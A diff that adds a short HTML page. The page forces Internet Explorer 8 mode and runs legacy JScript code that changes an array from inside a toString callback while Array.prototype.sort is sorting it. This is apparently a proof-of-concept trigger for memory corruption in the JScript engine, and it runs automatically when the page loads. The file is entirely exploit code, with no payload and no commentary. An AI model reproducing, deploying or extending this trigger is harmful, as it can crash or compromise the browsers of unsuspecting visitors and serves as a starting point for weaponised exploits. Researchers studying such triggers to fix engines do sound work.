@@ -1,0 +1,23 @@
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+var vars = new Array(100);
+
+var arr = new Array(1000);
+for(var i=1;i<600;i++) arr[i] = i;
+
+var o = {toString:function() {
+  for(var i=600;i<1000;i++) {
+    arr[i] = 1337;
+  }
+}}
+
+function go() {
+  arr[0] = o;
+  Array.prototype.sort.call(arr);
+}
+
+
+go();
+
+</script>
